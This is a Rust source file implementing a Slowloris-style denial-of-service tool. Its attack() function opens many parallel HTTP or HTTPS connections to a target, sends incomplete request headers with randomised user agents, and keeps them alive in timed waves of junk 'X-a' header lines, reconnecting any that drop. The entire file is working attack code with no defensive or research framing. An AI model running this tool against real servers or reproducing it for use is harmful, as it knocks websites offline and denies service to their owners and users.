mod consts;
mod types;
mod err;

use types::Stream;
use err::LorisError;

extern crate native_tls;
extern crate url;
extern crate rand;
extern crate rayon;

use native_tls::TlsConnector;
use url::Url;
use rand::Rng;
use rayon::prelude::*;

use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;

pub fn attack(url: &str, timeout: u64, requests: u64, waves: u64) -> Result<(), LorisError> {
    println!("Preparing connections...");
    let url = Url::parse(url)?;
    let init_header = get_init_header(&url);
    let mut connections: Vec<_> = (0..requests)
        .into_par_iter()
        .map(|_| spawn_connection(&url, &init_header))
        .collect();

    println!(
        "Starting attack on {} with {} requests in {} waves, each lasting {} ms",
        url,
        requests,
        waves,
        timeout
    );
    for i in 0..waves {
        println!("Attack wave {}/{}", i + 1, waves);
        connections.par_iter_mut().for_each(|connection| {
            let loris_header = get_loris_header();
            let res = connection.write_all(&loris_header);
            if res.is_err() {
                println!("A connection timed out, recreating it... ");
                let mut new_connection = spawn_connection(&url, &init_header);
                std::mem::swap(connection, &mut new_connection);
            }
        });
        thread::sleep(Duration::from_millis(timeout));
    }
    Ok(())
}


fn get_stream(url: &Url) -> Stream<TcpStream> {
    let domain = url.host_str().expect("Failed to parse host string");
    let port = url.port_or_known_default().expect(
        "Failed to guess port for specified protocol",
    );
    let stream = TcpStream::connect((domain, port)).expect(&format!(
        "Failed to connect to {}:{}",
        domain,
        port
    ));
    if url.scheme() == "https" {
        let connector = TlsConnector::builder()
            .expect("Failed to create TlsConnectorBuilder")
            .build()
            .expect("Failed to build TlsConnector");
        Stream::Tls(connector.connect(domain, stream).expect(&format!(
            "Failed to connect to {} via TLS",
            domain
        )))
    } else {
        Stream::Plain(stream)
    }
}

fn spawn_connection(url: &Url, init_header: &[u8]) -> Stream<TcpStream> {
    let mut stream = get_stream(url);
    stream.write_all(init_header).expect(&format!(
        "Failed to send header to {}",
        url
    ));
    stream
}

fn get_init_header(url: &Url) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let user_agent = consts::USER_AGENTS[rng.gen_range(0, consts::USER_AGENTS.len())];
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n",
        url.path(),
        url.host_str().expect("Failed to parse host string"),
        user_agent
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!("X-a: {}\r\n", rand::random::<u64>())
        .as_bytes()
        .to_vec()
}
